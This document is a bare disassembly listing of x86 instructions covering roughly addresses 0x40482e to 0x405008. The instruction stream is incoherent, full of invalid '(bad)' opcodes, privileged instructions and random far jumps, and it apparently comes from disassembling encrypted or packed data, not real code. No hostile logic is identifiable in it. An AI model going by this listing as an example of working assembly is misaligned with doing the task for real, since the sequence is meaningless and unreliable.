  40482e:	jmp    0x404811
  404830:	mov    ds:0x2f53e4ba,al
  404835:	adc    al,0xf2
  404837:	rol    bl,0x22
  40483a:	and    BYTE PTR [eax+0x1183fee1],bh
  404840:	add    eax,0x2ec12ea3
  404845:	cdq    
  404846:	jmp    0x21a:0xcf225362
  40484d:	jl     0x4048cb
  40484f:	sub    edx,DWORD PTR [ecx]
  404851:	pop    ss
  404852:	int3   
  404853:	adc    DWORD PTR [ecx],esi
  404855:	(bad)  
  404856:	shr    DWORD PTR [eax-0x2af5e1b8],0xd7
  40485d:	stos   DWORD PTR es:[edi],eax
  40485e:	cmp    esi,DWORD PTR [ebx]
  404860:	pop    eax
  404861:	in     eax,dx
  404862:	and    al,0x14
  404864:	psubw  mm4,QWORD PTR [ebp-0x61eb425f]
  40486b:	out    dx,eax
  40486c:	lds    ebp,FWORD PTR [ecx]
  40486e:	pop    ebx
  40486f:	cli    
  404870:	mov    bl,0x84
  404872:	shr    DWORD PTR [esi-0x769f10de],1
  404878:	cmp    DWORD PTR es:[edx],0x2a
  40487c:	cdq    
  40487d:	pop    ebp
  40487e:	cmc    
  40487f:	daa    
  404880:	in     al,dx
  404881:	mov    dh,0xa7
  404883:	inc    ebp
  404884:	push   0xffffff98
  404886:	or     DWORD PTR [edx-0x76],0x2864359
  40488d:	shr    BYTE PTR [edx-0x46],cl
  404890:	sub    BYTE PTR [eax],0x99
  404893:	dec    edi
  404894:	pop    edx
  404895:	pushf  
  404896:	sbb    BYTE PTR [eax],cl
  404898:	rcr    DWORD PTR [edi+ecx*2],0x7c
  40489c:	cmp    DWORD PTR [ebx+0x51],ebx
  40489f:	push   es
  4048a0:	sub    DWORD PTR [ebp+0x2d],esi
  4048a3:	punpckhdq mm7,mm4
  4048a6:	push   0x52e53d6e
  4048ab:	repnz ds cmp ebx,ebx
  4048af:	sahf   
  4048b0:	xchg   ecx,eax
  4048b1:	or     al,0x7f
  4048b3:	mov    ecx,0xe03a6b25
  4048b8:	inc    esp
  4048b9:	arpl   WORD PTR [edi],sp
  4048bb:	enter  0x7b53,0x66
  4048bf:	xchg   edi,eax
  4048c0:	lea    ebx,[esp+edi*8-0x2f]
  4048c4:	dec    ecx
  4048c5:	ds fwait
  4048c7:	push   esi
  4048c8:	jno    0x404905
  4048ca:	aam    0xeb
  4048cc:	in     al,dx
  4048cd:	bound  esp,QWORD PTR cs:[edx+0x1a5323a5]
  4048d4:	test   edx,esi
  4048d6:	arpl   WORD PTR [edx+0x3c5e64d4],sp
  4048dc:	ds inc ebp
  4048de:	aad    0x6c
  4048e0:	pop    ss
  4048e1:	mov    BYTE PTR [edx],al
  4048e3:	jnp    0x404928
  4048e5:	outs   dx,BYTE PTR ds:[esi]
  4048e6:	and    ch,al
  4048e8:	xchg   esp,eax
  4048e9:	and    al,0xc5
  4048eb:	rol    ch,cl
  4048ed:	pop    ss
  4048ee:	sub    ebp,DWORD PTR [ebx+0x1edc9fbd]
  4048f4:	or     eax,0xb9ec9ea3
  4048fa:	pop    eax
  4048fb:	aam    0xf5
  4048fd:	sub    eax,0x6d8e6621
  404902:	rcr    BYTE PTR [ecx+0x29f47caa],0xd5
  404909:	ins    DWORD PTR es:[edi],dx
  40490a:	pop    es
  40490b:	sub    DWORD PTR [ebx+eiz*8+0x304847b3],ebp
  404912:	ins    BYTE PTR es:[edi],dx
  404913:	sub    esp,DWORD PTR [edx+0x1]
  404916:	adc    eax,0xff3ab837
  40491b:	hlt    
  40491c:	dec    edi
  40491d:	and    esi,0x6457888d
  404923:	rol    BYTE PTR [ebx-0x7f145d99],1
  404929:	call   0xa234:0xf90484eb
  404930:	scas   eax,DWORD PTR es:[edi]
  404931:	push   es
  404932:	push   0x1cf3ea1e
  404937:	mov    ebx,0xe2228bb6
  40493c:	xor    DWORD PTR [eax+0x69f31b72],esp
  404942:	hlt    
  404943:	data16 loop 0x404924
  404946:	imul   edi,esp,0x3c
  404949:	stos   DWORD PTR es:[edi],eax
  40494a:	mov    esp,0x8addbfda
  40494f:	imul   edx,DWORD PTR [ebx+0x3c646775],0x56741127
  404959:	sub    BYTE PTR [eax],al
  40495b:	add    bl,BYTE PTR [edx]
  40495d:	xor    ah,dh
  40495f:	pop    esp
  404960:	dec    BYTE PTR [eax+ebp*4-0x64736fc0]
  404967:	aaa    
  404968:	(bad)  
  404969:	call   0x7c0b59d0
  40496e:	dec    edx
  40496f:	adc    eax,0x3ff033e2
  404974:	xor    al,BYTE PTR [esi+0x67]
  404977:	ficom  DWORD PTR [edx-0x578104c6]
  40497d:	jo     0x4049e5
  40497f:	lock cmc 
  404981:	xor    BYTE PTR [eax-0x15],ch
  404984:	push   ecx
  404985:	pop    esi
  404986:	imul   ecx,edx,0x2e0d7def
  40498c:	jne    0x4049fe
  40498e:	ret    
  40498f:	add    eax,0xd4a80a4d
  404994:	imul   esp,DWORD PTR [edi],0x3f02877e
  40499a:	or     eax,0x464e78c1
  40499f:	mov    ch,0xba
  4049a1:	pop    ebx
  4049a2:	adc    eax,0x5c1c3cdc
  4049a7:	and    dl,dl
  4049a9:	mov    WORD PTR [edi+ecx*2-0x32],cs
  4049ad:	je     0x404a20
  4049af:	stos   BYTE PTR es:[edi],al
  4049b0:	add    al,0x58
  4049b2:	dec    esp
  4049b3:	ret    0xe699
  4049b6:	jne    0x4049e9
  4049b8:	cmp    eax,0xbe179b29
  4049bd:	fstp   QWORD PTR [ecx-0x73]
  4049c0:	inc    ebx
  4049c1:	push   edx
  4049c2:	mov    cl,0x24
  4049c4:	scas   al,BYTE PTR es:[edi]
  4049c5:	mov    eax,0x2b1dcd58
  4049ca:	dec    ecx
  4049cb:	sub    bl,BYTE PTR [edx+eiz*8]
  4049ce:	dec    ebx
  4049cf:	inc    edi
  4049d0:	jl     0x404a3b
  4049d2:	adc    DWORD PTR [ebx*2-0x3c92531d],ebp
  4049d9:	xor    esp,edi
  4049db:	mov    bh,0x16
  4049dd:	stc    
  4049de:	inc    ebx
  4049df:	js     0x4049b6
  4049e1:	ss inc ebx
  4049e3:	(bad)  
  4049e4:	clc    
  4049e5:	int3   
  4049e6:	sbb    al,0x6a
  4049e8:	pusha  
  4049e9:	adc    ah,ah
  4049eb:	sbb    al,ah
  4049ed:	adc    DWORD PTR [edx+0x5aeeef9e],esi
  4049f3:	jnp    0x4049b9
  4049f5:	sti    
  4049f6:	and    ecx,DWORD PTR [edi-0x47592e0c]
  4049fc:	retf   0xb82f
  4049ff:	push   edx
  404a00:	out    dx,eax
  404a01:	ja     0x404985
  404a03:	sub    al,0xe9
  404a05:	(bad)  
  404a06:	addr16 mov ds:0xf030,al
  404a0a:	lock (bad) 
  404a0c:	jmp    0x1491:0x80b92dc2
  404a13:	push   cs
  404a14:	in     eax,0xeb
  404a16:	div    BYTE PTR [ecx-0x6e]
  404a19:	dec    eax
  404a1a:	(bad)  [ebx-0x5d]
  404a1d:	cmp    BYTE PTR [ebx],bh
  404a1f:	out    0x28,al
  404a21:	fdivr  DWORD PTR [ebx+edx*8+0x4d]
  404a25:	jl     0x4049d0
  404a27:	scas   eax,DWORD PTR es:[edi]
  404a28:	sbb    al,0x44
  404a2a:	xor    cl,BYTE PTR [ebp+0x6a879ce7]
  404a30:	and    DWORD PTR [esi+0xe],edi
  404a33:	adc    al,0x9a
  404a35:	pop    ebp
  404a36:	stos   BYTE PTR es:[edi],al
  404a37:	test   al,0x5a
  404a39:	rcl    BYTE PTR [esi+ebx*4],0x96
  404a3d:	dec    edi
  404a3e:	mov    bl,0xf8
  404a40:	mov    bx,0x3c56
  404a44:	retf   0xe0fc
  404a47:	dec    esi
  404a48:	xor    ah,BYTE PTR [edx]
  404a4a:	add    esp,eax
  404a4c:	jne    0x4049da
  404a4e:	dec    edx
  404a4f:	into   
  404a50:	add    eax,0x7287fbfe
  404a55:	mov    al,0x84
  404a57:	xchg   edi,eax
  404a58:	or     DWORD PTR [edx-0x1c],esi
  404a5b:	dec    edi
  404a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a5d:	jno    0x404a20
  404a5f:	mov    ch,0x75
  404a61:	mov    eax,0x13abefad
  404a66:	push   cs
  404a67:	adc    ch,BYTE PTR [edi+ebx*1-0x7f346cd8]
  404a6e:	and    al,0xb1
  404a70:	inc    esi
  404a71:	cmp    BYTE PTR [edx-0x5a4ecda1],ah
  404a77:	xor    DWORD PTR [ebp-0x3654fa7a],esi
  404a7d:	or     DWORD PTR [esi-0x3e8c279e],ebp
  404a83:	cwde   
  404a84:	push   ebp
  404a85:	inc    eax
  404a86:	pop    ecx
  404a87:	push   edi
  404a88:	rol    DWORD PTR [eax-0x4fc95ddf],1
  404a8e:	jmp    0xdd5:0x959a08b1
  404a95:	cmp    DWORD PTR [esi],ecx
  404a97:	push   esp
  404a98:	xchg   BYTE PTR [edi],dh
  404a9a:	ins    BYTE PTR es:[edi],dx
  404a9b:	mov    ebp,0x8212fa6c
  404aa0:	clts   
  404aa2:	loope  0x404adf
  404aa4:	xchg   ebx,eax
  404aa5:	mov    esi,DWORD PTR [esp+esi*2]
  404aa8:	mov    WORD PTR [eax],ss
  404aaa:	mov    ecx,DWORD PTR [ebx+eax*1]
  404aad:	stc    
  404aae:	sti    
  404aaf:	(bad)  
  404ab0:	ffree  st(7)
  404ab2:	dec    esp
  404ab3:	sub    al,0x6d
  404ab5:	mov    DWORD PTR [ebp+0x444d53aa],ebp
  404abb:	cmp    eax,0x8b162b90
  404ac0:	mov    BYTE PTR [esi-0x6f137f45],al
  404ac6:	sub    BYTE PTR [edx+0x63],bh
  404ac9:	bound  edi,QWORD PTR [ebx-0x396673c7]
  404acf:	push   ecx
  404ad0:	rcr    BYTE PTR [edi+0x5c],0x2
  404ad4:	xor    al,0x98
  404ad6:	retf   0xa270
  404ad9:	fisubr DWORD PTR [edi-0x7]
  404adc:	xor    esp,edx
  404ade:	add    ecx,edx
  404ae0:	mov    cl,0x3f
  404ae2:	adc    BYTE PTR [ebx-0x7f],ch
  404ae5:	data16 sar BYTE PTR ss:[eax+0x10],cl
  404aea:	push   ss
  404aeb:	jmp    0x8ced3089
  404af0:	or     eax,0x31386814
  404af5:	lock sub ecx,DWORD PTR [ebx-0x1bd05003]
  404afc:	lahf   
  404afd:	pop    edi
  404afe:	int    0x48
  404b00:	imul   eax,DWORD PTR [edi+0x50f03bff],0x65c4c14c
  404b0a:	inc    edi
  404b0b:	cmp    al,0xd9
  404b0d:	ffree  st(2)
  404b0f:	adc    ecx,DWORD PTR [edi-0x2d88c257]
  404b15:	(bad)  
  404b16:	imul   esp,DWORD PTR [ebx*2-0x6f87f74f],0x67
  404b1e:	mov    WORD PTR [edi+edi*4-0x408ccf48],fs
  404b25:	xor    eax,0x1a9f380a
  404b2a:	(bad)  [eax-0x31]
  404b2d:	fwait
  404b2e:	iret   
  404b2f:	mov    eax,ds:0x61a51cbc
  404b34:	scas   al,BYTE PTR es:[edi]
  404b35:	call   0xa090:0xaefeca03
  404b3c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  404b3e:	popf   
  404b3f:	push   esi
  404b40:	ins    DWORD PTR es:[edi],dx
  404b41:	jmp    0x404af2
  404b43:	inc    esp
  404b44:	and    ebp,esp
  404b46:	xchg   ebp,eax
  404b47:	inc    edi
  404b48:	mov    edi,DWORD PTR [eax-0x7c97ba14]
  404b4e:	int3   
  404b4f:	daa    
  404b50:	add    BYTE PTR [ecx-0x12],0x2e
  404b54:	rcr    DWORD PTR [ecx],cl
  404b56:	in     eax,0xc6
  404b58:	(bad)  
  404b59:	enter  0x5e5b,0xd2
  404b5d:	in     al,0x54
  404b5f:	das    
  404b60:	mov    ebx,0x355851db
  404b65:	xchg   esi,eax
  404b66:	inc    esp
  404b67:	aaa    
  404b68:	loope  0x404b97
  404b6a:	in     eax,0x1d
  404b6c:	fsubp  st(2),st
  404b6e:	sub    al,0x39
  404b70:	in     al,dx
  404b71:	push   ss
  404b72:	push   es
  404b73:	in     eax,0x65
  404b75:	dec    eax
  404b76:	pop    ecx
  404b77:	xor    eax,0xce42f4ca
  404b7c:	dec    edi
  404b7d:	dec    DWORD PTR [ecx+0x44bef580]
  404b83:	and    bh,BYTE PTR [ecx]
  404b85:	cmp    eax,0x53089988
  404b8a:	sahf   
  404b8b:	pop    DWORD PTR [eax-0x1c1c31b2]
  404b91:	mov    dl,0x27
  404b93:	xchg   edx,eax
  404b94:	pop    ss
  404b95:	push   edx
  404b96:	fnstenv es:[esi-0x44]
  404b9a:	push   ss
  404b9b:	add    BYTE PTR [edx+0x28],bh
  404b9e:	adc    al,0xac
  404ba0:	jge    0x404ba2
  404ba2:	push   ebx
  404ba3:	int3   
  404ba4:	add    al,0xd7
  404ba6:	add    BYTE PTR [ebx+0x5f603ef6],al
  404bac:	wrmsr  
  404bae:	in     al,dx
  404baf:	adc    BYTE PTR [eax],bl
  404bb1:	bound  ecx,QWORD PTR [ebp-0x35]
  404bb4:	call   0x749de759
  404bb9:	mov    fs,WORD PTR es:[esi-0x65]
  404bbd:	fwait
  404bbe:	mov    eax,ds:0x5e162dcc
  404bc3:	jmp    0x404ba5
  404bc5:	into   
  404bc6:	das    
  404bc7:	xchg   esi,eax
  404bc8:	xor    al,0x9c
  404bca:	jnp    0x404b73
  404bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bcd:	in     eax,0xd9
  404bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bd0:	ret    0x6a6b
  404bd3:	scas   eax,DWORD PTR es:[edi]
  404bd4:	pmullw mm7,mm4
  404bd7:	cmp    al,0x10
  404bd9:	in     eax,dx
  404bda:	out    dx,eax
  404bdb:	fisttp DWORD PTR [ebx-0x7e]
  404bde:	pop    edi
  404bdf:	adc    eax,0x17645201
  404be4:	ror    BYTE PTR [esi-0x58],0x84
  404be8:	sahf   
  404be9:	jmp    0x30e717e0
  404bee:	mov    cl,0x9b
  404bf0:	fwait
  404bf1:	orps   xmm7,XMMWORD PTR [edx+eax*8-0x46]
  404bf6:	inc    eax
  404bf7:	jg     0x404b81
  404bf9:	mov    ds:0xe4b0c356,eax
  404bfe:	jne    0x404c69
  404c00:	mov    al,ds:0x675b2bd8
  404c05:	mov    ebp,0x7168a951
  404c0a:	(bad)  
  404c0b:	adc    bl,BYTE PTR [ebx+0x71b4b629]
  404c11:	xor    al,0xe
  404c13:	jno    0x404c03
  404c15:	add    ch,BYTE PTR [eax-0x6e593294]
  404c1b:	icebp  
  404c1c:	in     al,dx
  404c1d:	jnp    0x404c19
  404c1f:	add    eax,esp
  404c21:	dec    eax
  404c22:	add    DWORD PTR [esi+0x3e],ecx
  404c25:	popa   
  404c26:	popa   
  404c27:	sub    ebp,esp
  404c29:	in     eax,dx
  404c2a:	retf   0x73cc
  404c2d:	pop    edx
  404c2e:	(bad)  
  404c2f:	or     eax,0x7bad39c8
  404c34:	call   0x236c:0x95954439
  404c3b:	std    
  404c3c:	jb     0x404c06
  404c3e:	fs pop ebp
  404c40:	hlt    
  404c41:	push   es
  404c42:	(bad)  
  404c43:	pop    ecx
  404c44:	mov    al,0x2
  404c46:	lea    ecx,[eax]
  404c48:	sbb    edi,edi
  404c4a:	cmp    al,0xb4
  404c4c:	add    BYTE PTR [edx],dl
  404c4e:	(bad)  
  404c4f:	jbe    0x404bd8
  404c51:	dec    esp
  404c52:	aas    
  404c53:	sub    al,0x71
  404c55:	pop    edx
  404c56:	dec    esi
  404c57:	(bad)  
  404c58:	sar    esi,1
  404c5a:	xlat   BYTE PTR ds:[ebx]
  404c5b:	jge    0x404bf1
  404c5d:	outs   dx,DWORD PTR ds:[esi]
  404c5e:	and    DWORD PTR [edx-0x70],edi
  404c61:	push   ss
  404c62:	xor    DWORD PTR [esi-0x71617987],eax
  404c68:	jcxz   0x404c30
  404c6b:	adc    ebx,DWORD PTR [esi]
  404c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c6e:	sub    al,BYTE PTR [esi]
  404c70:	add    esp,DWORD PTR ss:[ecx+0x32]
  404c74:	loope  0x404c13
  404c76:	sbb    BYTE PTR [esi],ch
  404c78:	pop    ds
  404c79:	or     ah,BYTE PTR [eax-0x7a]
  404c7c:	les    edx,FWORD PTR [eax-0x37]
  404c7f:	cs in  eax,0x3b
  404c82:	pop    edi
  404c83:	inc    ebx
  404c84:	repz xchg esp,eax
  404c86:	xchg   ebp,eax
  404c87:	loope  0x404ceb
  404c89:	push   esi
  404c8a:	inc    edi
  404c8b:	push   ss
  404c8c:	shl    edx,0xfe
  404c8f:	cwde   
  404c90:	xor    eax,0x9633fd73
  404c95:	dec    ecx
  404c96:	leave  
  404c97:	loope  0x404c35
  404c99:	mov    esi,0xf51e714e
  404c9e:	sti    
  404c9f:	xchg   ecx,eax
  404ca0:	lahf   
  404ca1:	dec    edx
  404ca2:	rcr    cx,1
  404ca5:	inc    esp
  404ca6:	lods   al,BYTE PTR ds:[esi]
  404ca7:	add    DWORD PTR [esi+0x44462397],0xf471050e
  404cb1:	pop    esi
  404cb2:	je     0x404cab
  404cb4:	lods   al,BYTE PTR ds:[esi]
  404cb5:	daa    
  404cb6:	jmp    DWORD PTR [ebx-0x22]
  404cb9:	cmc    
  404cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cbb:	stc    
  404cbc:	inc    ebx
  404cbd:	xchg   ebp,eax
  404cbe:	cmp    DWORD PTR [edx-0x66],esp
  404cc1:	lods   al,BYTE PTR ds:[esi]
  404cc2:	add    eax,0x18bee321
  404cc7:	ja     0x404cb4
  404cc9:	jb     0x404d0e
  404ccb:	pushf  
  404ccc:	fwait
  404ccd:	sbb    eax,0x7962ff02
  404cd2:	adc    esi,eax
  404cd4:	sbb    DWORD PTR ds:0xa0633cdd,ebx
  404cda:	rol    ch,1
  404cdc:	aam    0x8a
  404cde:	cmc    
  404cdf:	mov    esi,0xb905a0c1
  404ce4:	mov    al,0xa4
  404ce6:	mov    ebx,0x7e2f471f
  404ceb:	(bad)  
  404cec:	test   al,0x4b
  404cee:	dec    ebx
  404cef:	je     0x404d17
  404cf1:	add    BYTE PTR [edx+edx*4-0x78b502ab],bl
  404cf8:	xchg   esi,eax
  404cf9:	xchg   ebx,eax
  404cfa:	sar    BYTE PTR [ebx+0x464ff147],0x8c
  404d01:	sbb    edx,DWORD PTR [edx-0x68fad823]
  404d07:	and    eax,0xced39593
  404d0c:	stos   DWORD PTR es:[edi],eax
  404d0d:	inc    ebp
  404d0e:	cld    
  404d0f:	and    ch,cl
  404d11:	lods   al,BYTE PTR ds:[esi]
  404d12:	and    eax,0x176bf042
  404d17:	or     al,0x73
  404d19:	add    al,0x94
  404d1b:	mov    edx,0x70f58cd8
  404d20:	mov    ds:0xb84659b2,eax
  404d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d26:	cs repnz cld 
  404d29:	jl     0x404cf4
  404d2b:	ds dec edx
  404d2d:	je     0x404d81
  404d2f:	fstp   DWORD PTR [edx+0x1cf1a0f6]
  404d35:	sub    ecx,esp
  404d37:	rcr    ah,0x1e
  404d3a:	sbb    eax,0x24e28339
  404d3f:	lds    ebx,FWORD PTR ds:0xb4949f71
  404d45:	fcomip st,st(1)
  404d47:	mov    ah,0xf7
  404d49:	fisubr DWORD PTR [ebx-0x54]
  404d4c:	inc    edx
  404d4d:	jo     0x404d03
  404d4f:	(bad)  
  404d51:	shl    DWORD PTR es:[edi-0x64],0x7a
  404d56:	jg     0x404cf7
  404d58:	sbb    dh,bh
  404d5a:	jl     0x404d4c
  404d5c:	mov    dh,0xa2
  404d5e:	mov    ecx,0xe8ee6a5e
  404d63:	loopne 0x404d10
  404d65:	sbb    edi,ecx
  404d67:	aam    0xf8
  404d69:	out    dx,eax
  404d6a:	shl    DWORD PTR [ebx+esi*4],cl
  404d6d:	rcl    esi,0xd3
  404d70:	pop    edx
  404d71:	dec    ebp
  404d72:	dec    edi
  404d73:	stc    
  404d74:	and    BYTE PTR [esi],ch
  404d76:	xchg   ebp,eax
  404d77:	cmp    al,0xa8
  404d79:	adc    ecx,DWORD PTR [edi+0x1356799d]
  404d7f:	mov    esi,0xeca28e8e
  404d84:	xchg   esp,eax
  404d85:	pushf  
  404d86:	add    esi,DWORD PTR ds:0x8f4d9a8c
  404d8c:	xor    al,0x85
  404d8e:	mov    ds:0xf7d3ee4e,eax
  404d93:	push   ss
  404d94:	cmp    eax,0xe64d7f06
  404d9a:	mov    cl,0xc4
  404d9c:	lock popa 
  404d9e:	dec    edx
  404d9f:	imul   ecx,eax,0x3a
  404da2:	scas   al,BYTE PTR es:[edi]
  404da3:	and    ebx,eax
  404da5:	jl     0x404d63
  404da7:	inc    ebx
  404da8:	stc    
  404da9:	mov    gs,ebp
  404dab:	mov    bh,0x55
  404dad:	push   ss
  404dae:	fisttp DWORD PTR [edx+0x1f0b38a]
  404db4:	mov    cl,0xa0
  404db6:	and    ecx,DWORD PTR [ecx]
  404db8:	dec    ax
  404dba:	outs   dx,BYTE PTR ds:[esi]
  404dbb:	fs das 
  404dbd:	fldenv [esi]
  404dbf:	xchg   ebx,eax
  404dc0:	pushf  
  404dc1:	fnstsw WORD PTR [edi-0x3c27dfda]
  404dc7:	(bad)  
  404dc8:	shl    DWORD PTR [edi+0x4144dbf2],1
  404dce:	or     eax,0xf21588
  404dd3:	sub    al,BYTE PTR [ecx+eax*2]
  404dd6:	test   eax,0xcacd955b
  404ddb:	mov    ebp,0x785682ec
  404de0:	je     0x404d96
  404de2:	fmul   DWORD PTR [ebx]
  404de4:	mov    bh,0x49
  404de6:	adc    ch,0x7e
  404de9:	and    DWORD PTR [ebx-0x74],edx
  404dec:	push   cs
  404ded:	clc    
  404dee:	ja     0x404e3d
  404df0:	mov    ecx,0x2237c6df
  404df5:	xlat   BYTE PTR ds:[ebx]
  404df6:	out    dx,eax
  404df7:	pop    edx
  404df8:	std    
  404df9:	or     esp,DWORD PTR [ebp-0x7a68230e]
  404dff:	ins    BYTE PTR es:[edi],dx
  404e00:	sahf   
  404e01:	mov    DWORD PTR [ebx+ebx*2+0x502a41c7],edx
  404e08:	pop    edx
  404e09:	add    eax,0x1393809a
  404e0e:	outs   dx,BYTE PTR ds:[esi]
  404e0f:	in     ax,0xaa
  404e12:	pop    ebp
  404e13:	ja     0x404dc4
  404e15:	arpl   WORD PTR [ebx-0x2a97196b],ax
  404e1b:	ss sub eax,0xa733a1ac
  404e21:	gs push ds
  404e23:	clc    
  404e24:	inc    eax
  404e25:	sub    esp,DWORD PTR [ebx-0x52b45c4a]
  404e2b:	loopne 0x404e6e
  404e2d:	sbb    al,0xfe
  404e2f:	mov    dh,0x68
  404e31:	sbb    eax,0x1b681b5f
  404e36:	scas   al,BYTE PTR es:[edi]
  404e37:	fst    QWORD PTR [ebx]
  404e39:	pop    ebp
  404e3a:	hlt    
  404e3b:	scas   al,BYTE PTR es:[edi]
  404e3c:	inc    eax
  404e3d:	fdiv   DWORD PTR [esi+0x65]
  404e40:	cmp    bh,BYTE PTR [edx-0x2a]
  404e43:	cld    
  404e44:	xlat   BYTE PTR ds:[ebx]
  404e45:	xchg   BYTE PTR [ecx+edx*1],dl
  404e48:	sbb    ah,BYTE PTR [edx-0x7953ba37]
  404e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e4f:	add    esi,DWORD PTR [edx]
  404e51:	mov    ebp,0x1ab6c800
  404e56:	in     eax,0x48
  404e58:	xchg   dl,dh
  404e5a:	pop    ebx
  404e5b:	mov    DWORD PTR [ebx+0x431bebb0],eax
  404e61:	loopne 0x404dfc
  404e63:	lds    ebp,FWORD PTR [ebp-0x2]
  404e66:	pop    esp
  404e67:	daa    
  404e68:	enter  0xcb2f,0x42
  404e6c:	add    al,0x34
  404e6e:	inc    ecx
  404e6f:	pusha  
  404e70:	pusha  
  404e71:	cli    
  404e72:	js     0x404e1e
  404e74:	sub    eax,0x1267109b
  404e79:	push   ebx
  404e7a:	add    BYTE PTR [edx+0x18d69adf],cl
  404e80:	or     DWORD PTR [edi],eax
  404e82:	or     BYTE PTR [esi-0x282a58a0],0x58
  404e89:	data16 scas al,BYTE PTR es:[edi]
  404e8b:	push   es
  404e8c:	xchg   ebp,eax
  404e8d:	iret   
  404e8e:	cli    
  404e8f:	mov    cl,BYTE PTR [esi+0x70]
  404e92:	ins    DWORD PTR es:[edi],dx
  404e93:	dec    ebp
  404e94:	inc    ecx
  404e95:	mov    al,ds:0x95afa85f
  404e9a:	cdq    
  404e9b:	xchg   edi,eax
  404e9c:	out    dx,al
  404e9d:	mov    ebp,0x66647f25
  404ea2:	add    ebp,eax
  404ea4:	hlt    
  404ea5:	push   ebp
  404ea6:	inc    edx
  404ea7:	sbb    al,0x54
  404ea9:	addr16 call 0xbb470cf0
  404eaf:	call   DWORD PTR [ecx-0x35261c5f]
  404eb5:	mov    eax,ds:0xe4574abd
  404eba:	out    dx,al
  404ebb:	pop    esp
  404ebc:	outs   dx,BYTE PTR ds:[esi]
  404ebd:	sbb    ebx,DWORD PTR [esi-0x38c00c04]
  404ec3:	loopne 0x404eff
  404ec5:	sub    eax,0x5c8eec35
  404eca:	add    ecx,DWORD PTR [edi+0x40]
  404ecd:	and    dh,dl
  404ecf:	push   cs
  404ed0:	adc    al,BYTE PTR [ebx+0x2cdcf8a9]
  404ed6:	jns    0x404ef3
  404ed8:	leave  
  404ed9:	ficomp WORD PTR ds:[edi+0x65]
  404edd:	push   ecx
  404ede:	push   ds
  404edf:	pushf  
  404ee0:	inc    ecx
  404ee1:	pop    ss
  404ee2:	adc    dl,ch
  404ee4:	(bad)  
  404ee5:	in     al,0x90
  404ee7:	loop   0x404f3c
  404ee9:	and    dl,BYTE PTR [ebx]
  404eeb:	xor    eax,0xdcf6acd
  404ef0:	dec    edx
  404ef1:	and    dl,BYTE PTR [edx-0x3bee5944]
  404ef7:	(bad)
  404efa:	int    0xb9
  404efc:	push   0xffffffce
  404efe:	mov    eax,0xae277875
  404f03:	inc    edx
  404f04:	jnp    0x404f68
  404f06:	push   ebp
  404f07:	sub    eax,0xdfcc5914
  404f0c:	in     al,dx
  404f0d:	pushf  
  404f0e:	push   cs
  404f0f:	xor    BYTE PTR [ebx+0x4ea75f5a],ch
  404f15:	mov    cl,0x96
  404f17:	or     cl,BYTE PTR [ebx+eax*4-0x36]
  404f1b:	rcl    DWORD PTR [ebx],1
  404f1d:	int3   
  404f1e:	lods   eax,DWORD PTR ds:[esi]
  404f1f:	push   DWORD PTR [eax]
  404f21:	push   ds
  404f22:	out    dx,al
  404f23:	push   ds
  404f24:	inc    ebp
  404f25:	(bad)  
  404f26:	push   0x6359d019
  404f2b:	pop    ecx
  404f2c:	mov    ds:0x73e0fb,al
  404f31:	jo     0x404f8d
  404f33:	adc    DWORD PTR [esi],ebx
  404f35:	xor    BYTE PTR [ebx+0x69],0x94
  404f39:	pop    es
  404f3a:	lahf   
  404f3b:	cmc    
  404f3c:	std    
  404f3d:	mov    dh,0xe
  404f3f:	loope  0x404ee6
  404f41:	lods   eax,DWORD PTR ds:[esi]
  404f42:	pop    esi
  404f43:	xchg   esi,eax
  404f44:	(bad)  
  404f46:	fiadd  DWORD PTR [eax+0x3a6c0f86]
  404f4c:	daa    
  404f4d:	jno    0x404f29
  404f4f:	mov    ch,0x38
  404f51:	mov    al,ds:0x20d8b86c
  404f56:	ret    
  404f57:	xor    eax,0x4dadf4bb
  404f5c:	mov    esp,0xafb3129
  404f61:	dec    edi
  404f62:	and    DWORD PTR [edi-0x39e6994b],esp
  404f68:	mov    ecx,0x3e905649
  404f6d:	std    
  404f6e:	push   esi
  404f6f:	push   ebx
  404f70:	cs pop edx
  404f72:	fstp   TBYTE PTR [esi+0x7f164e8c]
  404f78:	(bad)  
  404f79:	xor    dl,dh
  404f7b:	xchg   BYTE PTR [esi-0x1298103d],al
  404f81:	inc    edx
  404f82:	adc    eax,0x94e2e09c
  404f87:	mov    esp,0xe87ea8b5
  404f8c:	mov    ah,0x95
  404f8e:	daa    
  404f8f:	pop    ecx
  404f90:	aas    
  404f91:	add    ah,BYTE PTR [ebx+ebx*2-0x55749c6d]
  404f98:	jmp    FWORD PTR [edi-0x3490e217]
  404f9e:	sub    ebp,esi
  404fa0:	jmp    0x4b8e:0x80a8ba1b
  404fa7:	mov    esi,0x6cd9fe0d
  404fac:	inc    ebx
  404fad:	dec    edi
  404fae:	dec    eax
  404faf:	popf   
  404fb0:	data16 scas al,BYTE PTR es:[edi]
  404fb2:	add    eax,0x6c3cdf2b
  404fb7:	loopne 0x404f52
  404fb9:	mov    bh,0xdb
  404fbb:	shr    BYTE PTR [esi],0xef
  404fbe:	ret    0xc199
  404fc1:	push   ds
  404fc2:	push   es
  404fc3:	mov    ?,WORD PTR [edi+0x27]
  404fc6:	inc    esi
  404fc7:	in     eax,dx
  404fc8:	jbe    0x404f59
  404fca:	jmp    0x4d4b:0x857d9e0
  404fd1:	jae    0x404ffb
  404fd3:	mov    ds:0x2965b3a0,eax
  404fd8:	(bad)  
  404fda:	jp     0x405018
  404fdc:	pusha  
  404fdd:	jmp    0xf278d68e
  404fe2:	dec    ecx
  404fe3:	jl     0x404f85
  404fe5:	mov    al,0xdf
  404fe7:	add    BYTE PTR [ebp-0x27],dl
  404fea:	mov    cl,0x8d
  404fec:	add    dl,ah
  404fee:	jl     0x404f77
  404ff0:	add    DWORD PTR [edi],esi
  404ff2:	sub    DWORD PTR [ebp+0x6f],0x5c4faac9
  404ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ffa:	sbb    DWORD PTR ds:0xc870d60b,ecx
  405000:	gs jbe 0x40505b
  405003:	adc    eax,0x811044e5
  405008:	mov    bh,0x50
